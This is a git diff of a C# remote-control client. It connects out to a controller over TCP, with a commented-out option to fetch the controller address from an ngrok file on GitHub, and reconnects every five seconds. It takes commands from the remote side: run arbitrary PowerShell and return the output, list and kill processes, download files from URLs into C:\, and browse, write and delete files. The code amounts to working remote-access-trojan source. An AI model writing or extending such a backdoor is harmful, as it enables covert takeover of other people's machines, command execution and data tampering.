@@ -1,44 +1,124 @@
-﻿using System;
+﻿
 using System.Diagnostics;
-using System.IO;
 using System.Net;
 using System.Net.Sockets;
+using System.Runtime.InteropServices;
 using System.Text;
 
 namespace clin;
 
 internal class Pro
 {
-    private static string host = "127.0.0.1";
-
-    private static int port = 25565;
+   
     static string direct_work = "C:\\";
+    [DllImport("user32.dll")]
+    public static extern IntPtr GetForegroundWindow();
+    [DllImport("user32.dll")]
+    public static extern bool GetWindowRect(IntPtr hWnd, out RECT lpRect);
+
+    [StructLayout(LayoutKind.Sequential)]
+    public struct RECT
+    {
+        public int Left;
+        public int Top;
+        public int Right;
+        public int Bottom;
+    }
 
     private static void Main()
     {
-
+       
     A:
-      /*  using (WebClient client = new WebClient()) 
+
+
+            string host = "127.0.0.1";
+            int port = 25565;
+        try {
+            
+            bool IsDirectoryEmpty(string path)
         {
-          string file =  client.DownloadString("https://raw.githubusercontent.com/pag6666/ngrok_file/main/ngrok_server_connection");
-            string[]arr= file.Split(':');
-            host = arr[0];
-            port = int.Parse(arr[1]);
-
-        }*/
-            //try {
-            string ClientCommannds(string command, Stream stream)
+            return !Directory.EnumerateFileSystemEntries(path).Any();
+        }
+        string ClientCommannds(string command, Stream stream)
             {
-
-                string[] helper = new string[] { "nano$ --path $ --text", "open$ --path", "cat$ --path", "help", "username", "browser_open$ --Uri", "clear", "cd$ --path", "cd..", "ls", "now_cd", "l", "mkdir$ --path", "rmdir$ --path" };
+            Process[] allProcesses= new Process[0];
+                string[] helper = new string[] {"cmd$ --command","kill$ --pid","ps","nano$ --path$ --text", "open$ --path", "cat$ --path", "help", "username", "googleopen$ --Uri", "googledownload$ --Uri$ --path", "clear", "cd$ --path", "cd..", "ls", "showcd", "l", "mkdir$ --path", "rmdir$ --path" };
                 string requst = "null";
+                string strCmdText = "null";
                 string[] parse_comamnd = command.Split("$");
                 command = parse_comamnd[0];
                 command = command.ToLower().Trim();
                 string select_dir = "empty";
                 string select_file = "empty.txt";
+                int select_pid = 0;
                 switch (command)
                 {
+                    
+                    case "cmd":
+                      
+                        if (parse_comamnd.Length > 1)
+                        {
+
+                            strCmdText = parse_comamnd[1];
+                            if (strCmdText.Trim().Length > 0)
+                            {
+                                Process process = Process.Start(new ProcessStartInfo
+                                {
+                                    FileName = "powershell",
+                                    Arguments = "/command chcp 65001 & "+strCmdText,
+                                    UseShellExecute = true,
+                                    CreateNoWindow = true,
+                                    RedirectStandardOutput = true
+
+                                });
+                                requst = process.StandardOutput.ReadToEnd();
+                            }
+                            else 
+                            {
+                                requst = "command == null";
+                            }
+                        }
+                        else 
+                        {
+                            requst = "argument 1?";
+                        }
+
+                        
+                        break;
+                    case"kill":
+                    if (parse_comamnd.Length>1) 
+                    {
+                        allProcesses = Process.GetProcesses();
+                        if (int.TryParse(parse_comamnd[1], out select_pid))
+                        {
+                            foreach (var index in allProcesses) 
+                            {
+                                if (index.Id == select_pid)
+                                {
+                                    index.Kill();
+                                    requst = "process kill";
+                                }
+                                else 
+                                {
+                                    requst = "process not found";
+                                }
+                            }
+                        }
+                        else 
+                        {
+                            requst = "this is pid not corect";
+                        }
+                    }
+                    break;
+                    case"ps":
+                    string temp_process="";
+                    allProcesses = Process.GetProcesses();
+                    foreach (var index in allProcesses) 
+                    {
+                        temp_process += $"| Id - {index.Id}, PNaem - {index.ProcessName}, BPriority - {index.BasePriority}, Title - {index.MainWindowTitle}|\n";
+                    }
+                    requst = temp_process;
+                    break;
                     case "": requst = "empty"; break;
                     case "help":
                         {
@@ -53,10 +133,40 @@ internal class Pro
                     case "username":
                         requst = Environment.MachineName;
                         break;
-                    case "browser_open":
+                    case "googledownload":
+                    using (WebClient client = new WebClient()) 
+                    {
+                        string answer3 = "empty";
+                        if (parse_comamnd.Length > 1)
+                        {
+                            answer3 = parse_comamnd[1];
+                        }
+                        else
+                        {
+                            requst = "argument 1?";
+                        }
+                        if (parse_comamnd.Length > 2) {
+                            if (Uri.TryCreate(answer3, UriKind.Absolute, out Uri uri))
+                            {
+                                client.DownloadFile(answer3, direct_work + parse_comamnd[2].Trim());
+                                requst = "success";
+                            }
+                            else
+                            {
+
+                                requst = $"not correct Uri";
+                            }
+                        }
+                        else 
+                        {
+                            requst = "argument 2?";
+                        }
+                    }
+                        break;
+                    case "googleopen":
                         {
                             string answer2 = "empty";
-                            if (parse_comamnd.Length > 0)
+                            if (parse_comamnd.Length > 1)
                             {
                                 answer2 = parse_comamnd[1];
                             }
@@ -147,9 +257,10 @@ internal class Pro
                     case "cd..":
                         string temp_dir2 = "";
                         string[] parse_sh = direct_work.Split("\\");
+                    if (direct_work!="C:\\") {
                         if (parse_sh.Length > 0)
                         {
-                            for (int i = 0; i < parse_sh.Length - 1; i++)
+                            for (int i = 0; i < parse_sh.Length - 2; i++)
                             {
                                 if (i < parse_sh.Length) {
                                     temp_dir2 += $"{parse_sh[i]}\\";
@@ -158,15 +269,16 @@ internal class Pro
                             direct_work = temp_dir2;
                             requst = temp_dir2;
                         }
+                    }
                         break;
-                    case "now_cd":
+                    case "showcd":
                         requst = direct_work;
                         break;
                     case "test":
                         requst = "test";
                         break;
                     case "mkdir":
-                        if (parse_comamnd.Length > 0)
+                        if (parse_comamnd.Length > 1)
                         {
                             select_dir = parse_comamnd[1];
                         }
@@ -174,10 +286,21 @@ internal class Pro
                         {
                             requst = "argument 1?";
                         }
-                        Directory.CreateDirectory($"{direct_work}{select_dir.Trim()}\\").Create();
+                    if (!Directory.Exists(direct_work + select_dir))
+                    {
+                        if (select_dir.Trim().Length > 0)
+                        {
+                            Directory.CreateDirectory($"{direct_work}{select_dir.Trim()}\\").Create();
+                            requst = "direct created";
+                        }
+                        else 
+                        {
+                            requst = "direct empty";
+                        }
+                    }
                         break;
                     case "rmdir":
-                        if (parse_comamnd.Length > 0)
+                        if (parse_comamnd.Length > 1)
                         {
                             select_dir = parse_comamnd[1];
                         }
@@ -185,10 +308,23 @@ internal class Pro
                         {
                             requst = "argument 1?";
                         }
-                        Directory.Delete($"{direct_work}{select_dir.Trim()}\\");
+                    if (Directory.Exists(direct_work+select_dir)) {
+                        if (select_dir.Trim().Length > 0) {
+                            if (IsDirectoryEmpty(direct_work + select_dir.Trim() + "\\"))
+                            {
+                                Directory.Delete($"{direct_work}{select_dir.Trim()}\\"); 
+                                requst = "direct remove";
+                            }
+                            else 
+                            {
+                                requst = "the folder is not empty";
+                            }
+                           
+                        }
+                    }
                         break;
                     case "open":
-                        if (parse_comamnd.Length > 0)
+                        if (parse_comamnd.Length > 1)
                         {
                             select_file = parse_comamnd[1].Trim();
                         }
@@ -229,7 +365,7 @@ internal class Pro
                         }
                         break;
                     case "nano":
-                        if (parse_comamnd.Length > 0)
+                        if (parse_comamnd.Length > 1)
                         {
                             select_file = parse_comamnd[1].Trim();
                         }
@@ -238,7 +374,7 @@ internal class Pro
                             requst = "argument 1?";
                         }
                         
-                        if (parse_comamnd.Length > 1)
+                        if (parse_comamnd.Length > 2)
                         {
                         if (File.Exists(direct_work + select_file))
                         {
@@ -249,10 +385,12 @@ internal class Pro
                         {
                           
                             if (Directory.Exists(direct_work)) {
-                             
-                                File.Create(direct_work +select_file).Close(); 
-                                
-                                File.WriteAllText(direct_work+ select_file, parse_comamnd[2].Trim());
+
+                                if (select_file.Trim().Length > 0) {
+                                    File.Create(direct_work + select_file).Close();
+
+                                    File.WriteAllText(direct_work + select_file, parse_comamnd[2].Trim());
+                                }
                             }
                             requst = "save text";
                         }
@@ -262,6 +400,20 @@ internal class Pro
                             requst = "argument 2?";
                         }
                         break;
+                    case "rm":
+                        if (parse_comamnd.Length > 1)
+                        {
+                            select_file = parse_comamnd[1].Trim();
+                        }
+                    if (File.Exists(direct_work + select_file))
+                    {
+                        if (select_file.Trim().Length > 0) {
+                            File.Delete(direct_work + select_file);
+                            requst = "remove text";
+                        }
+                    }
+
+                    break;
                     default:
                         requst = "Client: the command was not found"; break;
 
@@ -283,6 +435,15 @@ internal class Pro
                 stream.Write(buffer, 0, buffer.Length);
                 stream.Flush();
             }
+           /* using (WebClient client = new WebClient())
+            {
+                string file = client.DownloadString("https://raw.githubusercontent.com/pag6666/ngrok_file/main/ngrok_server_connection");
+                string[] arr = file.Split(':');
+                host = arr[0];
+                port = int.Parse(arr[1]);
+
+            }*/
+            Console.WriteLine($"host = {host} port = {port}");
             using (TcpClient client = new TcpClient(host, port))
             {
                 using Stream stream = client.GetStream();
@@ -299,13 +460,13 @@ internal class Pro
                 }
             }
 
-           /* }
+            }
         catch(Exception e)
         {
             Console.WriteLine(e.Message);
             Thread.Sleep(5000);
             goto A;
         }
-*/
+
         }
 }
